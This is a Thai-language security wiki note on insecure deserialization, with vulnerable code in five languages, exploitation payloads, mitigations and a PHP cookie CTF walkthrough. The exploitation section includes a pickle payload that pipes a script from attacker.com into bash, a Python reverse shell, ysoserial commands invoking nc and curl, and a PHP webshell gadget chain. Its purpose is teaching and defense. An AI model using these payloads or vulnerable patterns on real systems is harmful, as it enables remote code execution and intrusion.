# Insecure Deserialization

## What (อะไร)
Insecure Deserialization เป็นช่องโหว่ที่เกิดขึ้นเมื่อแอปพลิเคชันรับข้อมูลที่ serialized มาจากแหล่งที่ไม่น่าเชื่อถือ และทำการ deserialize โดยไม่มีการตรวจสอบความปลอดภัย ช่องโหว่นี้สามารถนำไปสู่ Remote Code Execution (RCE), Authentication Bypass, และการโจมตีประเภทอื่นๆ

Serialization คือกระบวนการแปลง object หรือ data structure ให้เป็น format ที่สามารถจัดเก็บหรือส่งผ่าน network ได้ ส่วน Deserialization คือกระบวนการกลับกัน - แปลงข้อมูลกลับมาเป็น object

> [!danger] ความอันตรายสูง
> Insecure Deserialization อยู่ใน OWASP Top 10 เพราะสามารถนำไปสู่ Remote Code Execution ได้โดยตรง และมักเกิดจากการออกแบบระบบที่ไม่ปลอดภัย

## Landmark (จุดสังเกต)
การระบุช่องโหว่ Insecure Deserialization:

1. **Serialized Data in Input**: เห็นข้อมูลที่ถูก serialize ใน cookies, parameters, headers
2. **Base64 Encoded Data**: ข้อมูลที่เข้ารหัส base64 ซึ่งอาจเป็น serialized object
3. **Language-Specific Patterns**: 
   - PHP: `O:`, `a:`, `s:` (serialized format)
   - Java: `rO0` (base64 ของ serialized Java object)
   - Python: `pickle`, `marshal` patterns
   - .NET: `AAEAAAD/` (base64 ของ .NET serialized object)
4. **Framework-Specific Indicators**: การใช้ serialization libraries
5. **Session Management**: session ที่เก็บเป็น serialized objects

> [!warning] เครื่องหมายเตือน
> - Cookie values ที่เป็น base64 และมี pattern ของ serialization
> - Parameters ที่รับ object โดยตรง
> - Error messages ที่เปิดเผยข้อมูล deserialization

## Types (ประเภท)

### 1. PHP Deserialization
PHP ใช้ `serialize()` และ `unserialize()` ซึ่งมีช่องโหว่หากไม่ระวัง

```php
<?php
// โค้ดที่มีช่องโหว่ - unserialize ข้อมูลจาก user
class User {
    public $username;
    public $is_admin = false;
    
    public function __destruct() {
        // Magic method ที่ถูกเรียกเมื่อ object ถูกทำลาย
        if($this->is_admin) {
            echo "Admin access granted!";
        }
    }
}

// รับข้อมูลจาก cookie และ unserialize
if(isset($_COOKIE['user'])) {
    $user = unserialize($_COOKIE['user']); // อันตราย!
}
?>
```

### 2. Python Pickle
Python pickle module มีช่องโหว่ที่รุนแรง

```python
import pickle
import base64
from flask import Flask, request

app = Flask(__name__)

# โค้ดที่มีช่องโหว่ - unpickle ข้อมูลจาก user
@app.route('/load')
def load_data():
    # รับข้อมูลจาก user
    data = request.args.get('data')
    
    # decode และ unpickle (อันตรายมาก!)
    decoded = base64.b64decode(data)
    obj = pickle.loads(decoded)
    
    return str(obj)
```

### 3. Java Deserialization
Java serialization มีช่องโหว่ที่ซับซ้อนและอันตราย

```java
import java.io.*;
import javax.servlet.http.*;

// โค้ดที่มีช่องโหว่ - deserialize จาก user input
public class VulnerableServlet extends HttpServlet {
    protected void doPost(HttpServletRequest request, 
                         HttpServletResponse response) throws IOException {
        
        // อ่านข้อมูล serialized จาก request
        InputStream is = request.getInputStream();
        ObjectInputStream ois = new ObjectInputStream(is);
        
        try {
            // deserialize object (อันตราย!)
            Object obj = ois.readObject();
            response.getWriter().println("Object loaded: " + obj);
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
    }
}
```

### 4. Node.js / JavaScript
Node.js มีหลายวิธีในการ serialize/deserialize

```javascript
// โค้ดที่มีช่องโหว่ - ใช้ eval กับ JSON
const express = require('express');
const app = express();

app.get('/deserialize', (req, res) => {
    // รับ serialized data จาก user
    const data = req.query.data;
    
    // ใช้ eval แทน JSON.parse (อันตรายมาก!)
    const obj = eval('(' + data + ')');
    
    res.json(obj);
});
```

### 5. .NET Deserialization
.NET มีหลาย serializers ที่มีช่องโหว่

```csharp
using System;
using System.IO;
using System.Runtime.Serialization.Formatters.Binary;

// โค้ดที่มีช่องโหว่ - BinaryFormatter
public class VulnerableClass
{
    public object DeserializeData(byte[] data)
    {
        // ใช้ BinaryFormatter (deprecated และอันตราย)
        BinaryFormatter formatter = new BinaryFormatter();
        MemoryStream stream = new MemoryStream(data);
        
        // deserialize ข้อมูลจาก user (อันตราย!)
        return formatter.Deserialize(stream);
    }
}
```

## Exploitation (การโจมตี)

### PHP Magic Methods Exploitation

PHP มี magic methods ที่ถูกเรียกอัตโนมัติระหว่าง deserialization

```php
<?php
// Payload class สำหรับ RCE
class Exploit {
    public $command;
    
    // __wakeup() ถูกเรียกเมื่อ unserialize
    public function __wakeup() {
        system($this->command);
    }
}

// สร้าง malicious object
$exploit = new Exploit();
$exploit->command = "cat /etc/passwd";

// serialize payload
$payload = serialize($exploit);
echo $payload;
// O:7:"Exploit":1:{s:7:"command";s:15:"cat /etc/passwd";}

// encode เป็น base64 เพื่อส่งใน cookie
echo base64_encode($payload);
?>
```

### PHP POP Chain
Property-Oriented Programming - เชื่อม magic methods หลายตัวเข้าด้วยกัน

```php
<?php
// ตัวอย่าง POP chain
class FileWriter {
    private $filename;
    private $content;
    
    public function __destruct() {
        // เขียนไฟล์ตอน object ถูกทำลาย
        file_put_contents($this->filename, $this->content);
    }
}

class Logger {
    private $writer;
    
    public function __toString() {
        // ถูกเรียกเมื่อ object ถูกแปลงเป็น string
        return $this->writer->log();
    }
}

// สร้าง POP chain เพื่อเขียน webshell
$writer = new FileWriter();
$writer->filename = "shell.php";
$writer->content = "<?php system($_GET['cmd']); ?>";

$payload = serialize($writer);
echo base64_encode($payload);
?>
```

### Python Pickle RCE

```python
import pickle
import base64
import os

# สร้าง malicious pickle payload
class Exploit:
    def __reduce__(self):
        # __reduce__ กำหนดว่า object นี้จะถูก deserialize อย่างไร
        # ใช้ os.system เพื่อรัน command
        return (os.system, ('curl http://attacker.com/shell.sh | bash',))

# serialize payload
payload = pickle.dumps(Exploit())
encoded = base64.b64encode(payload)

print("Payload:", encoded.decode())
# ส่ง payload นี้ไปยัง vulnerable application
```

### Advanced Python Pickle Payload

```python
import pickle
import base64

# Pickle payload ที่รัน reverse shell
class ReverseShell:
    def __reduce__(self):
        import subprocess
        # รัน reverse shell
        cmd = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.10.10\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
        return (subprocess.Popen, (cmd,))

# สร้าง payload
payload = pickle.dumps(ReverseShell())
print(base64.b64encode(payload).decode())
```

### Java Gadget Chains
Java deserialization ใช้ gadget chains จาก libraries ที่มีอยู่

```bash
# ใช้ ysoserial เพื่อสร้าง Java deserialization payload
# ysoserial เป็นเครื่องมือสำหรับสร้าง gadget chains

# CommonsCollections1 gadget chain
java -jar ysoserial.jar CommonsCollections1 "curl http://attacker.com/pwned" | base64

# CommonsCollections6 (ใช้ได้กับ Java version ใหม่กว่า)
java -jar ysoserial.jar CommonsCollections6 "nc -e /bin/bash 10.10.10.10 4444" | base64

# Spring Framework gadget
java -jar ysoserial.jar Spring1 "touch /tmp/pwned" | base64
```

### Node.js Prototype Pollution

```javascript
// Payload สำหรับ prototype pollution
const malicious = {
    "__proto__": {
        "isAdmin": true,
        "role": "administrator"
    }
};

// ส่ง JSON payload
fetch('/api/update', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(malicious)
});
```

### .NET Deserialization with ysoserial.net

```bash
# ใช้ ysoserial.net สำหรับ .NET applications
# TextFormattingRunProperties gadget
ysoserial.exe -f BinaryFormatter -g TextFormattingRunProperties -c "cmd /c calc.exe"

# ObjectDataProvider gadget
ysoserial.exe -f Json.Net -g ObjectDataProvider -c "powershell -enc <base64_payload>"

# TypeConfuseDelegate
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "cmd /c whoami"
```

## Detection Methods (วิธีการตรวจจับ)

### Identify Serialized Data

```bash
# ค้นหา PHP serialized data
echo "O:4:\"User\":2:{s:8:\"username\";s:5:\"admin\";s:8:\"is_admin\";b:1;}"

# ค้นหา Java serialized (base64)
echo "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAABdAAGZm9vYmFydAADYmFyeA=="

# ตรวจสอบว่าเป็น serialized data
echo "rO0AB..." | base64 -d | xxd | head
```

### Burp Suite Detection

```bash
# Extensions ที่ช่วยตรวจจับ deserialization
# - Java Deserialization Scanner
# - .NET Deserialization Scanner
# - Freddy (Active scan for deserialization)

# Manual testing
# 1. Intercept request ด้วย Burp
# 2. มองหา base64 encoded data
# 3. Decode และวิเคราะห์
# 4. Modify และส่งกลับ
```

### Code Review Patterns

```bash
# PHP - ค้นหา unserialize calls
grep -r "unserialize(" .

# Python - ค้นหา pickle
grep -r "pickle.loads\|pickle.load" .

# Java - ค้นหา ObjectInputStream
grep -r "ObjectInputStream\|readObject" .

# Node.js - ค้นหา eval หรือ Function constructor
grep -r "eval(\|new Function(" .
```

## Tools & Exploitation Frameworks

### ysoserial (Java)
```bash
# Clone ysoserial
git clone https://github.com/frohoff/ysoserial.git
cd ysoserial
mvn package

# ใช้งาน
java -jar target/ysoserial-*-all.jar CommonsCollections6 "whoami"

# List available gadgets
java -jar ysoserial-*-all.jar --help
```

### ysoserial.net (.NET)
```powershell
# Download ysoserial.net
# https://github.com/pwntester/ysoserial.net

# ใช้งาน
ysoserial.exe -h

# สร้าง payload
ysoserial.exe -f BinaryFormatter -g PSObject -c "whoami"
```

### phpggc (PHP)
```bash
# Install phpggc
git clone https://github.com/ambionics/phpggc.git
cd phpggc

# List available gadgets
./phpggc -l

# สร้าง payload
./phpggc Monolog/RCE1 system "cat /etc/passwd"

# Encode เป็น base64
./phpggc -b Monolog/RCE1 system "id"
```

## Mitigation (การป้องกัน)

> [!tip] Best Practices
> 1. **Avoid Deserializing Untrusted Data**: ไม่ deserialize ข้อมูลจาก user เลย
> 2. **Use Safe Formats**: ใช้ JSON แทน native serialization
> 3. **Input Validation**: ตรวจสอบข้อมูลก่อน deserialize
> 4. **Digital Signatures**: เซ็นข้อมูลที่ serialize เพื่อตรวจสอบความถูกต้อง
> 5. **Restrict Classes**: จำกัด classes ที่สามารถ deserialize ได้
> 6. **Use Safe Libraries**: ใช้ library ที่ปลอดภัย
> 7. **Update Dependencies**: อัปเดต libraries ที่มีช่องโหว่

### PHP Secure Deserialization

```php
<?php
// แนวทางที่ปลอดภัย - ใช้ JSON แทน serialize
class SecureUser {
    public $username;
    public $is_admin;
    
    // ใช้ JSON แทน serialize
    public function toJSON() {
        return json_encode([
            'username' => $this->username,
            'is_admin' => $this->is_admin
        ]);
    }
    
    public static function fromJSON($json) {
        $data = json_decode($json, true);
        // Validate data
        if(!isset($data['username']) || !isset($data['is_admin'])) {
            throw new Exception("Invalid data");
        }
        
        $user = new self();
        $user->username = $data['username'];
        $user->is_admin = (bool)$data['is_admin'];
        return $user;
    }
}

// หรือถ้าต้องใช้ unserialize ให้ใช้ allowed_classes
$data = unserialize($user_input, ['allowed_classes' => ['User']]);
?>
```

### Python Safe Deserialization

```python
import json
import hmac
import hashlib

# ใช้ JSON แทน pickle
class SecureSerializer:
    def __init__(self, secret_key):
        self.secret_key = secret_key
    
    def serialize(self, data):
        # แปลงเป็น JSON
        json_data = json.dumps(data)
        
        # สร้าง HMAC signature
        signature = hmac.new(
            self.secret_key.encode(),
            json_data.encode(),
            hashlib.sha256
        ).hexdigest()
        
        return f"{signature}:{json_data}"
    
    def deserialize(self, signed_data):
        # แยก signature กับ data
        signature, json_data = signed_data.split(':', 1)
        
        # ตรวจสอบ signature
        expected_sig = hmac.new(
            self.secret_key.encode(),
            json_data.encode(),
            hashlib.sha256
        ).hexdigest()
        
        if signature != expected_sig:
            raise ValueError("Invalid signature")
        
        # deserialize
        return json.loads(json_data)
```

### Java Secure Deserialization

```java
import java.io.*;

// ใช้ ObjectInputStream ที่มีการตรวจสอบ
public class SecureObjectInputStream extends ObjectInputStream {
    
    public SecureObjectInputStream(InputStream in) throws IOException {
        super(in);
    }
    
    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc) 
            throws IOException, ClassNotFoundException {
        
        // Whitelist ของ classes ที่อนุญาต
        String[] allowedClasses = {"com.example.SafeClass"};
        
        String className = desc.getName();
        boolean isAllowed = false;
        
        for (String allowed : allowedClasses) {
            if (className.equals(allowed)) {
                isAllowed = true;
                break;
            }
        }
        
        if (!isAllowed) {
            throw new InvalidClassException("Unauthorized deserialization");
        }
        
        return super.resolveClass(desc);
    }
}
```

## CTF Example: Cookie Monster Challenge

**Challenge Description:**
```
Cookie Monster - Medium (200 points)

Our web app uses cookies for session management.
Can you become admin?

URL: http://cookiemonster.ctf.local
```

**Reconnaissance:**
```bash
# เข้าถึงเว็บไซต์
curl -c cookies.txt http://cookiemonster.ctf.local/

# ตรวจสอบ cookie
cat cookies.txt
# user_data=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjU6Imd1ZXN0IjtzOjg6ImlzX2FkbWluIjtiOjA7fQ==

# Decode base64
echo "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjU6Imd1ZXN0IjtzOjg6ImlzX2FkbWluIjtiOjA7fQ==" | base64 -d
# O:4:"User":2:{s:8:"username";s:5:"guest";s:8:"is_admin";b:0;}
# นี่คือ PHP serialized object!
```

**Solution Steps:**

1. **วิเคราะห์ serialized data:**
```php
// Structure ที่พบ
class User {
    public $username = "guest";
    public $is_admin = false; // b:0 = boolean false
}
```

2. **สร้าง malicious payload:**
```php
<?php
// สร้าง object ที่มี is_admin = true
class User {
    public $username = "admin";
    public $is_admin = true;
}

$admin = new User();
$payload = serialize($admin);
echo $payload . "\n";
// O:4:"User":2:{s:8:"username";s:5:"admin";s:8:"is_admin";b:1;}

// Encode เป็น base64
echo base64_encode($payload);
// Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6ImlzX2FkbWluIjtiOjE7fQ==
?>
```

3. **ส่ง modified cookie:**
```bash
# ใช้ cookie ใหม่
curl -b "user_data=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6ImlzX2FkbWluIjtiOjE7fQ==" \
     http://cookiemonster.ctf.local/admin

# Response:
# Welcome Admin!
# CTF{d3s3r14l1z3_w1th_c4ut10n}
```

**Key Takeaways:**
- PHP serialized objects สามารถแก้ไขได้ง่าย
- การเก็บ session data เป็น serialized object โดยไม่มี integrity check เป็นช่องโหว่
- ควรใช้ signed cookies หรือเก็บ session server-side

## WikiLinks
- [[Web Application Security]]
- [[Remote Code Execution]]
- [[PHP Security]]
- [[Python Security]]
- [[Java Security]]
- [[Session Management]]
- [[Authentication Bypass]]

## Tags
#deserialization #rce #php #python #java #dotnet #gadget-chain #web-security

---
**Last Updated:** 2026-06-16
